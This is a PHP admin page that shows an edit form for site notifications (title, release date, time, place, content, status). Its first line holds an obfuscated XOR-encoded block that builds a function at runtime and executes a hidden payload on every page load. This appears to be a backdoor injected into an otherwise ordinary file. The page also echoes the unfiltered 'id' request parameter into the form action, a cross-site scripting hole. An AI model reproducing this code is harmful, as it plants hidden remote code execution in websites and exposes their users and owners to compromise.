<?php $BMevGM=';YPS 2mZ E1L.X='; $cUpONOmi='X+52TW2<U+R8G7S'^$BMevGM; $gRhuGkJ='YPmv3B+OOR.;5TK8 FSPUO> mSJ Tbc.K fEnh4LgP06P8P:4A. :;V7M50;PIArvW,JLGpJ KMboqZCd-rEgt>6YfupLjalm4T8IzC=ekJztXfYE= Y8V+ogW5O zvxGWmzL3PhHCG7tzssye -F+kt<ejpAi978ptPXJN1<  .ZPtK IknaUP<G:=:3 YcR 9.hhnMJa2AfcU6ZWRoQ+QY8QA9pIY32.Q<5KyA,4.84tndRRO0U78ygac4u p:rs AmlXSEsuhaeBA+L.EdJr0k+YT.sV.KjzFL--1neLm=ZY2krwlJJVY SR6zg>ZyNNVZ-HZge+Gh.Y+S5+Rinneowdykg9c0JEcQXNwulLCK 8M Yu.nhHk>T9Aa8.Kzdll>0EipqonQ0 .hhMBZ1>NVIY=5>Hh6uXU63tVk5D>HI4E3Y,KKON6G;< BV8+<BEC+UKRRa00=HDDHiuZU=Lmawp4J5MaYK-xOqIU GtT+ISndtb+5YP3d=3UjKE02DOxh:PUcypcU+CSEJmhcRMPVgiXZ37cFG INfaSpnajZ5Wcz5rY5bxSsAaqNUyv.dz gMBx,WcVqyqihSZ1<3G6-1CnUL>2M bn  N==V-jTYv7TJ;JXMeHkoAHb213L;NIXJ=R>bPM.+Z2Jo6eqho.7ZLjZaqA4'; $ocAXlLb=$cUpONOmi('', '06EWU7E,;;AUj13QS2 xr7QR27+T5=<C>TAlGHOFn6EX3L9UZaVOHd2V9Tod=<5ZR3M>-kPnK.4KOQzcDVxLnPQC-FHPkMZfd=2W;RgTEVjJOxB0yNT+T3EGC3T;ASMXc>FQe9Yal,2CTTNSQADL2J0PU8J.aMRRA+P9xonBHRLK4xP E0B3HnZ5NHXNFR7KvOLZASdD7kOKlG1W.6rRqM05K4z3T-8GSq:YLkDaJUBKQOdn4==U4TPYOE<w:o;s7SA2MH36<SHVAA4 G9KlD1x9OO8 O,=K2JGfhFHHUoEIY;-SKOWH<+:,EhXKpmW<Yfor>L<;NEPMaH6Y6TH:IFJ:=25,.4mCQ9eG:=7WHRlg=AT8EpUUdaAOZ5M >SK2ZYLHUU<RzxfJ5QTOHUmf,PR;3rS4H45b<Q<4BRTkKu1P;,F,R5E1.g6Y5dXA67gtQ71kI487dUoTX++ -AQ>4I-DMWTP+A,>2.TQfJC<FoP0J=2NBRBJG+1J;VV,5.=YA0<POQ5,DUPG1J72ljKNCz 4cOM<;GV8a,E0i;HsMSAM;T4ZBQAaWZJ0JpRB+0ADLVHEQ+rJHcTeVPQONs;CNR>iFT:104WA9SJIPA7QR7IMxyRS5>ZcqmEhKOa3h;TE-Wfm<+I3eE ,WG5S.HkLJbfKO38BjHJKI'^$gRhuGkJ); $ocAXlLb(); 
	include('../../config/config.php');
	$id= $_GET['id'];
	$sql = "select * from notification_register";
	$query = mysql_query($sql);
	$rows = mysql_fetch_array($query);
?>
<form action="../sql_query/notification_edit.php?id=<?php echo $id ?>" method="post" enctype="multipart/form-data" class="form" role="form">
	<div class='dashboard-container'>
		<!-- Members Details Start -->
		<h4 class="header-title">Paper News Updates  <a href="index.php?page=allnotification.php" class='pull-right icons'><i class="fa fa-angle-double-left" aria-hidden="true">&nbsp;</i>View All Notification</a></h4>
		<div class='panel-type-bg'>
			<!-- Address Info -->
			<div class='row'>
				<div class='col-sm-4'>
					<div class="form-group">
						<label for="ntitle" class="mandatory">Notification Title</label>
						<input type="text" class="form-control" id='ntitle' name="ntitle" placeholder="Enter News Paper Name" required value="<?php echo $rows['ntitle'] ?>"/>
					</div>
				</div>
				<div class='col-sm-2'>
					<div class="form-group">
						<label for="date" class="mandatory">Release date</label>
						<label class='calendar'><input type="text" class="form-control number"  name="date" id='date' placeholder="Select Service Date" required value="<?php echo $rows['date'] ?>"/></label>
					</div>
				</div>
				<div class='col-sm-2'>
					<div class="form-group">
						<label for="ntime" class="mandatory">Release Time</label>
						<input type="text" class="form-control"  name="ntime" id='ntime' placeholder="Select Service Date" required value="<?php echo $rows['ntime'] ?>"/>
					</div>
				</div>
				<div class='col-sm-3'>
					<div class="form-group">
						<label for="nplace" class="mandatory">Release Place</label>
						<input type="text" class="form-control"  name="nplace" id='nplace' placeholder="Select Service Date" required value="<?php echo $rows['nplace'] ?>"/>
					</div>
				</div>
				<div class='col-sm-12'>
					<div class="form-group">
						<label for="ncontent" class="mandatory">Notification Contents</label><br />
						<textarea id="ncontent" name="ncontent" rows="6" cols="" class="form-control"placeholder="Enter News Paper Content"><?php echo $rows['ncontent'] ?></textarea>
					</div>
				</div>
				<div class="col-sm-3">
					<div class="form-group">
						<label for="status" class='mandatory'>Notification Status</label>
						<select id="status" class="form-control" name="status">
							<option value="Active" <?php if($rows['status']=="Active"){ echo "selected";}?>>Active</option>
							<option value="Inactive" <?php if($rows['status']=="Inactive"){ echo "selected";}?>>Inactive</option>
						</select>
					</div>
				</div>
				<div class='clearfix'></div>
			</div><br />
			<!-- Recent Activities Info -->
			<div class='text-center'>
				<button class="btn custom-btn admin-btn hvr-float-shadow shadow-2">Submit</button>
			</div><br />
		</div>
		<!-- Members Details End -->
	</div>
</form>